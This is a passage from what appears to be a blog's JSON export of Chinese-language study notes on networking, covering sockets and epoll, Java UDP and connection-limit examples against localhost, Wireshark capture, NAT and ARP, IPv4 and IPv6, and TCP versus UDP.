红黑树","slug":"计网/EPoll","date":"2021-06-29T17:16:25.000Z","updated":"2021-07-01T04:18:04.798Z","comments":true,"path":"2021/06/30/计网/EPoll/","link":"","permalink":"https://www.shanghua.live/2021/06/30/%E8%AE%A1%E7%BD%91/EPoll/","excerpt":"","text":"Socket 是什么flowchart TB subgraph one 客户端 &lt;--&gt; Socket对象1 end subgraph two 服务端 &lt;--&gt; Socket对象2 end Socket对象1 &lt;--&gt; three Socket对象2 &lt;--&gt; three subgraph three TCP&#x2F;IP end Socket 是一种文件，准确的来说是一种双线管道文件 管道文件：管道会将一个程序的输入，导向另一个程序的输入 双向管道文件：双向管道文件连接的程序是对等的，都可以作为输入和输出 服务端程序 12var serverSocket = new ServerSocket();serverSocket.bind(new InetSocketAddress(80)); 这里看起来是我们创建的是一个服务端 Socket 对象，但单纯看这个对象，它代表着什么呢？如果从管道文件来理解，就容易些 其一，这是一个文件 其二，它里面存的是所有客户端 Socket 文件的文件描述符 当一个客户端连接到服务端的时候，操作系统就会创建一个客户端的 Socket 文件。然后操作系统对这个文件的文件描述写入服务端程序创建的服务端 Socket 中，服务端 Socket 文件，是一个管道文件，如果读取这个文件的内容，就相当于从管道中取走了客户端的文件描述符 graph LR 硬件 --&gt; os((OS)) os --- data[Data 客户端 Socket] os --- file[文件描述符 服务端 Socket] Thread ---&gt; file 当线程想要读取客户端传来的数据时，就从客户端 Socket 文件中读取数据当线程想要发送数据到客户端时，就向客户端 Socket 文件中写入数据 服务端 Socket 的绑定比如 Nginx 监听 80 端口 Node 监听 3000 端口 SSH 监听 22 端口 Tomcat 监听 8080 端口 端口监听不能冲突，不然客户端连接进来创建客户端 Socket 文件文件描述服就不知道写入哪个服务端 Socket 文件服务端监听的本质，是将服务端 Socket 文件和端口绑定，这个操作也称为 bind。有时候我们不仅仅绑定端口，还需要绑定 IP 地址。这是因为有时候我们只允许指定 IP 访问我们的服务器程序 扫描和监听对于服务端程序，可以定期扫描服务端 Socket 文件的变更，来了解哪些客户端想要连接进来如果在客户端 Socket 文件中读取到一个客户端的文件描述服，就可以将这个文件描述符实例成一个 Socket 对象 graph LR ServerSocket --客户端 Socket 文件描述服--&gt; 服务端程序 服务端程序 --定期读取--&gt; ServerSocket 服务端程序 --Socket对象--&gt; s((客户端 Socket 集合)) 之后，服务端可以将这个 Socket 对象加入一个容器（集合），通过定期遍历所有的客户端 Socket 对象，查看背后 Socket 文件的状态从而确定是否有新的数据从客户端传输过来这样通过一个线程来响应多个客户端的计数，也被称作 I/O 多路复用技术 响应式 （Reactive）服务端程序（线程）需要维护一个 Socket 的集合，然后定期遍历这个集合 命令式的程序：遍历一个 Socket 集合看看有没有发生写入 graph LR 线程指挥官 --主动观察--&gt; Socket对象1 线程指挥官 --主动观察--&gt; Socket对象2 线程指挥官 --主动观察--&gt; Socket对象3 线程指挥官 --主动观察--&gt; Socket对象4 线程指挥官 --主动观察--&gt; Socket对象5 线程指挥官 --主动观察--&gt; Socket对象6 线程去遍历 Socket 对象，若 Sokcet 对象过多，会导致负担过重，吞吐量下降 响应式就不会有这样的情况 graph LR Socket对象1 --被动响应--&gt; 线程指挥官 Socket对象2 --被动响应--&gt; 线程指挥官 Socket对象3 --被动响应--&gt; 线程指挥官 Socket对象4 --被动响应--&gt; 线程指挥官 Socket对象5 --被动响应--&gt; 线程指挥官 Socket对象6 --被动响应--&gt; 线程指挥官 在响应式程序中，Socket 会主动通知指挥官，所以应该是有某个观察者观察到 Socket 文件状态的变化，从而通知处理线程响应。线程不需要遍历 Socket 集合，而是观察程序的通知当然最适合观察者其实是操作系统本身。在实现这个模型时，有几个事情需要主机 线程需要告诉中间的观察者自己要观察什么，或者说什么情况下才响应？比如具体到某个 Socket 发生了什么事件？是读写还是其他事情？这一步我们通常称为注册 中间的观察者需要实现一个高效的数据结构（通常情况下是基于红黑树的二叉搜索树），这是因为中间的观察者不仅仅是某个服务于某个线程，而是服务于很多的线程。当一个 Socket 文件发生变化的时候，中间的观察者需要知道，究竟是哪个线程需要这个信息，而不是将所有线程都遍历一边 总结 Socket 既是一种编程模型，或者说是一段程序，同时也是一个文件，一个双向管道文件。 一个线程可以通过读取服务端 Socket 文件中的内容拿到所有的客户端 Socket 这样一个线程就可以负责响应所有客户端的 I/O这种技术称为 I/O 多路复用 主动式的 I/O 多路复用，对负责 I/O 的线程压力过大，通常会设计一个 I/O 事件的观察者，线程通过订阅来被动响应，也就是响应式模型 操作系统内核为我们提供响应式实现 Linux 的设计中有三种典型的 I/O 多路复用模型 select 主动模型，需要线程通过一个集合存放所有的 Socket，然后发生 I/O 变化的时候遍历 poll 更优质的编程接口，本质与 select 相同，千级别下的 I/O 可以考虑 select 和 poll epoll 在操作系统内核提供了一个中间数据结构，这个中间数据结构会提供事件监听注册，以及快速判断消息关联到哪个线程的能力","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"Java UDP Socket","slug":"计网/JavaUDPSocket","date":"2021-06-29T12:42:45.000Z","updated":"2021-07-15T05:17:56.240Z","comments":true,"path":"2021/06/29/计网/JavaUDPSocket/","link":"","permalink":"https://www.shanghua.live/2021/06/29/%E8%AE%A1%E7%BD%91/JavaUDPSocket/","excerpt":"","text":"Java 创建 UDP socket创建 UDP ServerHello我们可以用 Java 中的 DatagramSocket 创建一个 UDP Server 1234567891011121314151617181920212223public class UdpEchoServer &#123; // 端口号 private static final int port = 8421; public static void main(String[] args) throws IOException &#123; // 创建 UDP socket DatagramSocket socket = new DatagramSocket(port); while (true) &#123; // 创建数据包 DatagramPacket packet = new DatagramPacket(new byte[512], 512); // 接受数据 socket.receive(packet); // 拼接收到的数据 String msg = new String(packet.getData(), 0, packet.getLength(), StandardCharsets.UTF_8); System.out.println(packet.getAddress() + &quot;:&quot; + packet.getPort() + &quot;&gt;&quot; + msg); // 将收到的数据加上 “server” 头 packet.setData((&quot;server:&quot; + msg).getBytes(StandardCharsets.UTF_8)); // 返回数据 socket.send(packet); &#125; &#125;&#125; Java 创建 UDP Client同样的使用 DatagramSocket 创建客户端 123456789101112131415161718192021222324252627282930313233public class UdpEchoClient &#123; private static final int remotePort = 8421; private static InetAddress remoteIp = null; static &#123; try &#123; // 获取本地 IP remoteIp = InetAddress.getLocalHost(); &#125; catch (UnknownHostException e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) throws IOException &#123; // 创建 UDP socket DatagramSocket socket = new DatagramSocket(); // 创建消息 byte[] outputMsg = &quot;hello Server&quot;.getBytes(); // 打包消息 DatagramPacket outputPacket = new DatagramPacket(outputMsg,outputMsg.length,remoteIp,remotePort); // 发送消息 socket.send(outputPacket); // 接受消息 DatagramPacket inputPacket = new DatagramPacket(new byte[512],512); socket.receive(inputPacket); // 将接受到的数据转换成 String String msg = new String(inputPacket.getData(),0,inputPacket.getLength(), StandardCharsets.UTF_8); System.out.println(msg); // 关闭连接 socket.close(); &#125;&#125; 运行首先运行 UdpEchoServer，运行后会监听本地 8421 端口，再运行 UdpEchoClient 向服务端发送消息可以看到服务端先打印了 /127.0.0.1:45793&gt;hello Server然后客户端打印 server:hello Server 使用 Wireshark 抓包如果客户端与服务端都运行在本地，需要在 Wireshark 选择网卡页面选择 Loopback:io 本地回环，来抓取本地数据包 在过滤窗口输入 udp.port == 8421 ,过滤 udp 协议 8421 端口，运行 UdpEchoServer 之后运行 UdpEchoClient 即可看到 udp 数据包，如图 客户端发往服务端数据包 服务器发往客户端的数据包 可以看到 UDP 数据包只有一来一回两个数据包，不像 TCP 协议需要先三次握手建立连接，每次收到数据都要发送给 ACK 断开连接需要四次挥手，非常麻烦","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"数据包抓包","slug":"计网/数据包抓包","date":"2021-06-27T15:09:52.000Z","updated":"2021-06-29T04:56:53.972Z","comments":true,"path":"2021/06/27/计网/数据包抓包/","link":"","permalink":"https://www.shanghua.live/2021/06/27/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8C%85/","excerpt":"","text":"WiresharkWireshark 是世界上应用最广泛的网络协议分析器，它让我们在微观层面上看到整个网络正在发生的事情。可以去 Wireshark 官网下载 Wireshark 官网 Wireshark 具有丰富的功能集 深入检查数百个协议，并不断添加更多协议 事实捕捉和离线分析 支持 Windows、Linux、MacOs、Solaris、等多种操作系统 提供 GPU 浏览、也可以通过 TTY 支持 VOIP 支持 Gzip 支持 IPSec 打开 WiresharkLinux 打开 Wireshark 如下界面 这里列出了电脑的网卡，你可以选择抓包的网卡，这里我的电脑是有限上网，所以选择 enp1s0，点击后会进入捕获页面 在这里可以看到非常多的数据包，有发送的，以及接受的数据包。页面没列以此是 序号（No）是 Wireshark 分配的一个从捕获开始的编号 时间（Time）是从捕获开始过去的时间戳，可以从在上方菜单栏 视图 -&gt; 时间显示格式 修改显示的格式 源地址和目标地址（Source 和 Destination）是 IP 协议，注意这里有 IPv6 的地址，也有 IPv4 的地址 协议可能有很多种，比如 TCP/UDP/ICMP 等，ICMP 是 IP 协议之上搭建的一个消息控制协议（Internet Conetol Message Protocol）比如 Ping 命令用的就是 ICMP； 还有 ARP 协议（Address Resolution Protocol）用来在局域网广播自己的 MAC 地址 Length 是消息的长度（Bytes） Info 是根据不同协议显示的数据，比如你可以看到 TCP 协议上看到 Seq 和 ACK。这里的 Seq 和 ACK 已经简化过了，正常情况是一个大随机数 观察 TCP 协议查看捕获页面的单个 TCP 协议 然后下方可以观察到详细内容 可以看到详细信息是从不同层面捕获的。从传输层看是 TCP 段；从网络层看是 IP 封包；从链路层看是 Frame 点开不同的层面观察 TCP 段，就可以获得对它更具体的认识，例如下图是从 TCP 层面理解这次捕获 可以看出这次是一次 ACK，从 80 端口发送到 60478，下方还有二进制窗口，可以看到此次消息的 16 进制形式 再来张全家图 Whireshark 追溯的是最底层网卡传输的 Frame（帧），可以追溯到数据的链路层。因此对我们二进制的解读，也就是消息试图也要分层。因为对同样的数据，不同层的解读是不同的 最上面是 Frame 数据，主要是关注数据的收发时间和大小 接着是数据链路层数据，关注的是设备的传递。你可以看到源 MAC 地址和目标 MAC 地址。 然后是网络层数据，IP层数据。这里有 IP 地址（源 IP 地址和目标 IP 地址）；也有头部 Checksum 最下面是传输层数据。也就是 TCP 协议。关注的是源端口，目标端口，Seq、ACK 等 有的传输层上还有一个 TLS 协议，这是因为用 HTTPS 请求了数据。TLS 也是传输层。TLS 是建立在 TCP 之上，复用了 TCP 的逻辑 观察 HTTP 协议 可以看到，Wireshark 不仅仅捕获了应用层，还可以看到这次 HTTP 捕获对应的传输层、网络层和链路层数据。 过滤和筛选Wireshark 还提供了捕获的过滤，我们只需要输入过滤条件，就可以只看符合条件的捕获。 首先我们通过 ping 命令查看百度的 IP 地址，如下图 在 Wireshark 中输入表达式 ip.addr == 39.156.66.18 ，如下图 这样就可以看到所有与 baidu 相关的连接。上图刚好是一次建立 TCP 连接（3 次握手），到 HTTPS 协议传输握手的完整过程。你可以只看到 192.168.1.109 到 39.156.66.18 的请求 首先是从客户端（192.168.1.5）发出的 SYN 和百度返回的 SYN-ACK，如下图所示： 然后是客户端返回给百度一个 ACK： 接下来是 HTTPS 协议开始工作 可以看到 HTTPS 协议通过 TLSv1.2 发送了 Client Hello 到服务端。接下来是 Server 返回给客户端 ACK，然后再发送给客户端一个 Server Hello： 之后百度回传了证书，握手结束 报文颜色在抓包过程中，黑色报文代表各类报文错误；红色代表出现异常；其他颜色代表正常传输 注意，红色是深红色，并不是此图中的粉红色","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"计算机网络入门 局域网-NAT","slug":"计网/局域网NAT","date":"2021-06-27T13:47:14.000Z","updated":"2021-06-27T07:09:04.290Z","comments":true,"path":"2021/06/27/计网/局域网NAT/","link":"","permalink":"https://www.shanghua.live/2021/06/27/%E8%AE%A1%E7%BD%91/%E5%B1%80%E5%9F%9F%E7%BD%91NAT/","excerpt":"","text":"NAT 是如何工作的当一个公司申请到一个公网 IP，会在公司内部设置一个局域网，这个局域网中通常 IP 地址，会以 192.168 开头当一个员工使用 UDP 协议发送信息向王者荣耀服务器，可是员工的 IP 地址是一个内网 IP，数据到王者荣耀服务器可以通过寻址和路由找到目的地但是数据从王者荣耀服务器回来的时候，王者荣耀服务器如何知道 192.168 开头的地址应该如何寻址呢？ 局域网数据交换（MAC 地址）设备间通讯的本质：设备拥有的网络接口（网卡）间的通信 为了区别每个网络接口，互联网工程任务组（IETF）要求每个设备拥有一个唯一的编号 MAC 地址 IP 地址不是唯一的吗?并不是的，如果你将电脑搬到另一个城市 IP 地址就会改变，电脑网卡的 MAC 地址不会发生变化数据交换，必须经过交换机，毕竟线路是由网卡连接交换机的 数据发送方将本身的 MAC 地址，以及目的地的 MAC 地址，Frame 或者封包，发送给交换机，交换机根据地址转发给目的地或者目的地的网卡这个 Frame，并不是 IP 协议的分组链路层的数据交换，支持 IP 协议工作，是网络层的底层如果 IP 协议要传输数据，就要将数据转换为链路层的分组，然后才可以在链路层传输，链路层的大小受限于链路层的网络设备、线路以及使用了链路层协议的设计MTU（Maximun Transmission Unit）最大传输单元 链路层网络允许的最大传输数据分组的大小MSS（Maximun Segment Size，最大段大小） TCP 段 TCP 分组（TCP Packet）的最大大小MSS 是传输层概念，MTU 是链路层概念MTU = MSS + TCP Header + IP HeaderTCP 传输的数据大于 MSS，就拆包，每个封包上加上 TCP Header，之后经过 IP 协议，再加上 IP Header，于是这个加上 IP 头的分组（Packet）不能超过 MTU 对于一个 网络接口，它如何能知道目标接口的 MAC 地址呢？ 地址解析协议（Address Resoulution Protocol，ARP）发送接口会发送一个广播查询给交换机，交换机将查询转发给所有接口，如果某个接口发现自己就是对方要查下的接口，则会将自己的 MAC 地址回传然后再交换机增加缓存条目，缓存采用的是逐级缓存的设计减少 ARP 请求（发送接口先查询本地的 ARP 表，如何本地没有数据，然后广播 ARP 查询） ARP 表是一种缓存，缓存需要考虑 失效时间、更新策略、数据接口 考虑使用 TTL（Time To Live）的设计，为每个缓存条目增加一个失效时间 更新策略可以考虑利用老化（Aging）算法模拟 LRU 家用设备会提供局域网 具备交换机的能力，又具有路由器的能力 当 ARP 表很大的时候，需要专门的、能够承受大量网络接口的交换设备 连接内网有时候，公司内部有多个子网，这个时候一个子网如果要访问另一个子网，就需要通过路由器也就是说。路由器其实充当了两个子网通讯的桥梁。发送接口并不能通过 MAC 地址发送数据到接收接口，因为两个子网之间只有路由器相连，子网1 的交换机不知道子网2 的交换机。这个时候发送方需要通过 IP 协议，将数据发送到路由器，再由路由器转发信息到子网2 的交换机子网2 的交换机通过 查询 ARP 表来找到 IP 地址的接口 连接外网（网络地址转换技术，NAT）flowchart LR; A[192.168.0.1] &lt;--私有网络--&gt; B[NAT + 路由器] &lt;--互联网--&gt; C[服务 22.22.22.22] 寻找目标 IP 地址 22.22.22.22 是一个公网 IP，可以通过正常的寻址 + 路由算法定位，当 22.22.22.22 寻找 192.168.0.1 的时候，是寻找一个私网 IP，这个时候是找不到的。这个时候就需要使用网络地址转换技术，NAT 技术转换的是 IP 地址，私有 IP 通过 NAT 转换为公网 IP 发送到服务区。服务器的响应通过 NAT转换为私有 IP，返回给客户端，通过这种方式就解决了内网和外网通讯的问题 总结 链路层发送数据靠的是 MAC 地址 交换机（链路层交换机）：不断接受数据，然后转发数据 地址解析协议（ARP）: 已知 IP 地址，找到 MAC 地址的协议 网络和网络的衔接，必须要有路由器（等价的设备）","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"IPv4 协议","slug":"计网/IP协议","date":"2021-06-23T17:37:43.000Z","updated":"2021-06-23T11:43:17.253Z","comments":true,"path":"2021/06/24/计网/IP协议/","link":"","permalink":"https://www.shanghua.live/2021/06/24/%E8%AE%A1%E7%BD%91/IP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"什么是 IP 协议IP 协议，是一个处于垄断地位的网络层协议，IPv4 就是 IP 协议的地 4 个版本，是目前互联网的主要网络层协议IPv4 是目前互联网的主要网络层协议。IPv4 为传输层提供 Host-To-Host 的能力，IPv4 需要底层数据链路层的支持IP 协议并不负责数据的可靠性，传输数据时，IP 协议还会对数据进一步拆分。进行两次拆分是为了适配底层的设备 可靠性是要保证数据无损传输到目的地，是由 IP 协议上方，Host-To-Host 协议保证了，TCP 通过应答机制，窗口等保证IP 协议自身不能保证可靠性。比如 IP 协议可能面临下面几个问题 封包损坏（数据传输过程中被损坏） 丢包（数据发送过程中丢失） 重发（数据被重发，比如中间设备通过 2 个路径传递数据） 乱序（到达目的地时数据与发送数据不一致） IP 协议并不会去处理这些问题，因为网络层只专注解决网络层的问题，而且不同特性的应用在不同场景下需要解决的问题不一样对于网络层，有三个问题需要解决 延迟 吞吐量 丢包率 IP 协议的工作原理IP 协议接受 IP 协议上方的 Host-To-Host 协议来传输数据，然后进行拆分，这个能力叫作切片（Fragmentation）IP 协议为每个片段（Fragmentation）增加一个 IP 头（Header），组成一个 IP 封包（Datagtam）。之后 IP 协议调用底层的局域网（数据链路层）传输数据。最后 IP 协议通过寻址和路由能力最终把封包送达目的地。 分片是吧数据切分成片IP 协议通过局域网（链路层）传输数据，因此需要适配底层传输网络的传输能力如果底层（链路层）发现一个未经过封包的数据，又没有能力传输时，就直接丢弃数据包在网络环境中往往存在多条路径，一条路径断了，说不定其他路径可能连通 增加协议头（IP Header） 分为四个部分 最重要的是原地址和目标地址。IPv4 的地址是4组8位的数字，总共是32位。 Type of Service 服务的类型是为了响应不同的用户诉求，用来选择延迟、吞吐量和丢包率之间的关系。 IML（Internet Header Length）用来描述 IP 协议头的大小。所以 IP 协议头的大小是可变的。IHL 只有4位，最大值 1111 = 15 最大是 15 个双字（15*4 字节 = 60 字节） Total Length 定义报文（封包 Datagram）的长度。 Identification（报文的 ID），发送方分配，代表顺序。 Fragment offset 描述要不要分包（拆分），以及如何拆分 Time To Live（TTL） 描述封包的存货时间。因此每个 IP 封包发送出去后，就开始销毁倒计时。如果倒计时为0就会销毁。比如中间的路由器看到一个 TTL 为0 的封包，就直接丢弃 Protcol 描述上层的协议，比如 TCP = 6，UDP = 17 Options 代表可选项 Checksum 用来检验封包的正确性，类似 UDP，如果 Checksum 不对，就要丢弃这个封包 Type of Service 延迟（Latency）指的是 1 bit 的数据从网络的一个终端传送到另一个终端需要的时间 吞吐量（Throughput）吞吐量指单位时间内可以传输的平均数据量 丢包率（Packet loss）指的是发送出去的封包没有到达指定目的地的比例 Type of Service 有4个选项低延迟，高吞吐量，地丢包率，低成本 寻址（Addressing）地址想要表达的是一个东西在哪里。寻址要做的就是：给一个地址，然后找到这个东西。IPv4 协议的寻址过程是逐级寻址。 IPv4 地址IPv4 地址是4个8位（Octet）排列而成，总共可以编址43亿个地址 103.16.3.1 103 16 3 1 01100111 0010000 00000011 001001 寻址过程 找到顶层网络比如 103.16.3.1 最顶层的网络号可以和 225.0.0.0 （子网掩码）做位运算得到103.16.3.1 &amp; 255.0.0.0 = 103.0.0.0因此103.0.0.0就是103.16.3.1所在的顶层网络。255.0.0.0.称作子网掩码。子网掩码的作用就是帮助根据 IP 地址找到对应子网。子网掩码是很多个1接着很多个0，和 IP 地址一起使用。 找到下一层网络接下来要找到下一层网络，就需要 IP 地址和下一级的子网掩码做位与运算103.16.3.1 &amp; 255.255.0.0 = 103.16.0.0其中 103.16.0.0 就是下一级的网络号 再下一级网络通过子网掩码 255.255.255.0 子网掩码找到下一级网络 103.16.3.0 定位设备设备就在子网 103.16.3.0 中，最终找到的设备号是 1当然子网掩码也不一定都是255，比如这个子网掩码255.240.0.0也是可以的。但通常我们把 IPv4 的网络分成这样 4 层。 路由（Routing）在寻址过程中，数据总是存在于某个局域网中。如果目的地在局域网中，就可以直接定位设备了。如果目的地不在局域网中，这个时候就需要再去往其他网络假设，我们要前往 IP 地址为 14.215.177.38 寻址，当前的路由器所在的网络编号是 16.0.0.0。那么我们就需要知道前往 14.0.0.0 网络的 Gateway IP 地址在当前网络执行 route 查看路由表，可能看到一条下面这样的记录。 Destination:14.0.0.0 Gateway:16.12.1.100 Mask:255.0.0.0 Iface:16.12.1.1 这条记录就表示如果你要去 14.0.0.0 网络，IP 地址，14.215.177.38 先要和 255.0.0.0,进行位运算然后查表 看到 14.0.0.0 得知去往 Gateway 的网卡（IFace） 是 16.12.1.1 总结 IP 协议会讲数据进行分片，将上游数据拆分成一个个的封包（Datagram），然后封包增加 IP 头部。封包发送出去后，就开始可寻址过程。寻址就是找到 IP 地址对应的设备，在同一局域网内，如果找不到设备，就需要路由。路由就是找打数据应该往哪里发送。最后通过层层路由定位到具体的设备。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"IPv6 协议","slug":"计网/IPv6协议","date":"2021-06-23T17:37:43.000Z","updated":"2021-06-27T05:47:19.654Z","comments":true,"path":"2021/06/24/计网/IPv6协议/","link":"","permalink":"https://www.shanghua.live/2021/06/24/%E8%AE%A1%E7%BD%91/IPv6%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"IPv4 用 32 位整数描述地址，最多支持 43 亿设备，显然不够用 可以拆分子网来解决 IPv4 不够用的问题，内外网数据交互，需要网络地址转换协议（NAT 协议），增加传输成本多级网络会增加数据的路由和传输链路，降低网络的速度 IPv62019 年据中国互联网络中心（CNNIC）统计，IPv6 协议目前在我国普及率 60%，已经位居时间首位 什么是 Tunnel 技术 IPv4 与 IPv6 相似点 IPv6：切片（Segmentation）、增加封包头、路由（寻址） IPv6：接受上方主机到主机（Host-To-Host）协议传递来的数据 最核心的能力：确保数据可以从发送主机到达接收主机 不相同点 IPv4地址是 4 个 8 位（octeat），共 32 位 IPv6 8 个 16 位（hextet），共 128 位 IPv4 使用 . 点分割 如 103.28.7.35 IPv6 使用 : 冒号分割 0123:4567:89ab:cdef:0123:4567:89ab:cdef 也可以省略前 64 字节简写为 0123:4567::0123:4567:0000:cdef:: 只能出现一次，相当于省略了若干个 0000。比如 1111::2222 相当于中间省略了 6 组 0000。如果出现两个 1111::2222::3333 就无法得知 0000 是如何分部的。开头的 0 也可以简写为 123:4567::123:4567:0:cdef还有一种情况，如果我们想后面都填 0 比如 3c4d::/16,这代表只有前 16 位有数据，后面是 0 IPv6 寻址寻址的目的：找到设备，以及规划到设备途径的路径，最核心的内容，对网络进行划分 全局单播寻址，1 对 1 寻址 本地单播 类似 IPv4 内部网络，开头必须是 fe80 分组多播（Group Multicast） 广播 任意播 特殊方式 全局单薄将消息从一个设备传到另一个设备全局单薄地址：目标就是定位网络中的设备IPv6 地址太多，因此不再需要子网掩码，而是直接将 IPv6 的地址分区即可 在全局单播中，IPv6 分为 3 部分 站点前缀（Site Prefix）48 bit，一般是由 ISP （Internet Service Providor，运营商）或者 RIR （Regional Internet Registry，地区性互联网注册机构），RIR 将 IP 地址分配给运营商 子网好（Subnet ID），16bit 用于站点内部区分子网 接口号（Interface），64bit，用于站点内部区分设备 因此 IPv6 也是树状结构，站点前缀需要一定资质，子网号与接口号内部定义。IPv6 的寻址过程就是先通过站点前缀找到站点，然后追踪子网；每个子网中，还可以用 64 位整数表示设备。 本地单播在局域网中，实现设备到设备的通讯虽然 IPv6 可以给每个设备一个 IP 地址，但是有些情况还是需要一个局域网络的 1234Format | Link-Locl prefix| 0 | Interface ID | | 10 bits | 64 bit | 54 bits|Example : fe80::123e:456d 分组多播实现广播：将消息同时发送给多个接收者 当 IP 地址以 8 个 1 开头，也就是 ff00 开头，后面会跟上一个分组的编号，就是在进行分组多播 任意播任意播：将消息发送给多个接收方，并选择一条最优的路径 在一个网络中有多个接收方，这些授时服务都共享了一个任播地址当一个客户端想要获取时间，就可以讲请求发送到这个任意播地址，客户端的请求扩散出去后，可能会找到授时服务中的一个或者多个，但是距离最近的往往会被先发现。这个时候，客户端使用它第一次收到的授时信息修正自己的时间 IPv4 和 IPv6 兼容两种情况 情况1：一个 IPv4 的网络和一个 IPv6 的网络通讯 首先 客户端去 DNS64（提供的一种解决 IPv4 和IPv6 兼容问题的 DNS 服务），这个查询服务会吧 IPv4 地址和 IPv6 地址同事返回 DNS64 服务器返回含 IPv4 地址的 AAAA 记录。 客户端将对应的 IPv4 地址请求发送给一个 NAT64 路由器 由这个 NAT64 路由器将 IPv6 地址转换为 IPv4 地址，从而访问 IPv4 网络，并收集结果 消息返回到客户端 情况2：一个 IPv6 的网络和一个 IPv6 的网络通讯，但是中间需要经过一个 IPv4 的网络 隧道的本质：在两个 IPv6 的网络出口网关处，实现一段地址转换的程序 总结 IPv6 IPv6 解决的是地址耗尽的问题, 减少了子网，更小的封包头部体积，提升了性能 Tunnel 技术是什么？ Tunnel 就是隧道，隧道不是只有一辆车通过，而是每天都有大量的车辆来来往往 两个网络，用隧道连接，位于两个网络中的通讯设备，都可以使用这个隧道","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"最大连接测试","slug":"计网/最大连接测试","date":"2021-06-23T15:09:52.000Z","updated":"2021-06-23T09:26:43.487Z","comments":true,"path":"2021/06/23/计网/最大连接测试/","link":"","permalink":"https://www.shanghua.live/2021/06/23/%E8%AE%A1%E7%BD%91/%E6%9C%80%E5%A4%A7%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/","excerpt":"","text":"Java 创建 Socket 连接一台内存在 8G 左右的服务器，可以同时维护多少连接？ 连接是内存中的状态对象，从理论上分析，连接本身不太占用内存。不同语言连接对象大小不等，但是通常很小。我们可以写个 Java 程序测试一下 Server 端 12345678910111213141516public class ServerDemo &#123; public static void main(String[] args) throws IOException &#123; var serverSocket = new ServerSocket(); // 3001 端口 var address = new InetSocketAddress(3001); serverSocket.bind(address); var list = new LinkedList&lt;&gt;(); while (true)&#123; // 监听连接 var client = serverSocket.accept(); list.add(client); System.out.println(list.size()); &#125; &#125;&#125; Client 端 123456789101112public class ClientDemo &#123; public static void main(String[] args) throws IOException, InterruptedException &#123; var clients = new LinkedList&lt;&gt;(); // 循环 一百万次 for (int i = 0; i &lt; 1000000; i++) &#123; // 连接 3001 端口 var client = new Socket(&quot;127.0.0.1&quot;,3001); clients.add(client); &#125; TimeUnit.SECONDS.sleep(100); &#125;&#125; 创建 100W 连接速度不快，说明 TCP 连接创建有成本 用 jps 找到对应的进程 id，用 sudo cat /proc/{进程ID}/status | grep VmHWM 查看占用内存 执行 jps 命令,我们可以看到输出 1234538931 Main42676 Launcher42679 Server39259 RemoteMavenServer3642734 Jps Server 就是我们启动的进程， 进程 ID 为 42679执行 bash 命令 1sudo cat /proc/42679/status | grep VmHWM 输出 VmHWM: 42636 kB,可以看到随着连接创建，占用不停增长当单机建立太多链接，会爆出 Cannot assign requested address 异常，这是由于没建立一个连接，操作系统就会为客户端分配端口号，端口号很快就被占用用尽 所以核心问题是，通信需要缓冲区，通讯需要 I/O 。这是因为通讯占用资源，连接本身占用资源少。 有哪些 好用的压力测试工具？压力测试最常用的工具是 Apache Benchmark （简称 AB） linux 可执行以下命令安装 123yum install httpd-tools// orapt-get install apache2-utils 还有一款更好用的 Java 生态工具 JMeter, 安装 Java 运行环境就可使用 具体用法有空我再做一篇笔记","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"TCP 和 UDP","slug":"计网/TCP和UDP","date":"2021-06-20T17:00:01.000Z","updated":"2021-06-23T04:43:16.057Z","comments":true,"path":"2021/06/21/计网/TCP和UDP/","link":"","permalink":"https://www.shanghua.live/2021/06/21/%E8%AE%A1%E7%BD%91/TCP%E5%92%8CUDP/","excerpt":"","text":"TCP 可靠性 HTTP 协议 1.1 和 2.2 UDP 灵活 HTTP 协议 3.0 UDP 协议UDP 在数据传输，网络控制，音视频，Web 技术UDP (User Datagram Protocol) 目标是在传输层提供直接发送报文(Datagram)的能力 Datagram 是数据传输的最小单位 UDP 协议不会帮助拆分数据，它的目标只有一个，就是发送报文 为什么不用 IP 协议呢 graph LR; A[应用层] --&gt; B[传输层] --&gt; C[IP协议层] 传输层 (端口号，每个端口代表不同的应用) IP 协议 (将数据从主机传输到主机) UDP 的封包格式 Soure Port(源端口号) Destination(目标端口号) Length(消息体长度) Checksum(校验和) Data octets。。。(一个一个字节数据) 校验和 (Checksum) 机制：校验数据在传输过程中有没有丢失、损坏。是一个普遍需求 简单的校验和程序 checksum=(a+b+c+d) ^ 0xff 接收方可以用同样的算法检查，不过还是可能碰撞 UDP 与 TCP 的区别 TCP (提供可靠的网络传输) UDP (在提供报文交换能力基础上尽可能地简化协议，轻装上阵)只管发送数据包，不管是否发送成功 TCP 是一个面向连接的协议(Connection-oriented Protocol) UDP 无连接协议 (Connection-less Protocol) TCP 流控技术(在发送缓冲区中存储数据，并在接受缓冲区中接受数据) UDP 没有流控，不过 UDP 协议简化，没有连接，可靠性检查等，速度更快 TCP 不适合高速传输数据场景(视频，游戏) UDP(Ping 和 DNSLookup，只需要一次简单的请求/返回，不需要建立连接) TCP 无损传输文件 UDP 传输数据更快 TCP HTTP 协议 UDP HTTP 3.0 理论上来讲，任何一个用 TCP 协议构成的成熟应用层协议，都可以用 UDP 重构 TCP 的场景 远程控制 File Transfer Protocol(FTP) 邮件(SMTP，IMAP)等 点对点文件传出(微信等) UDP 场景 网络游戏 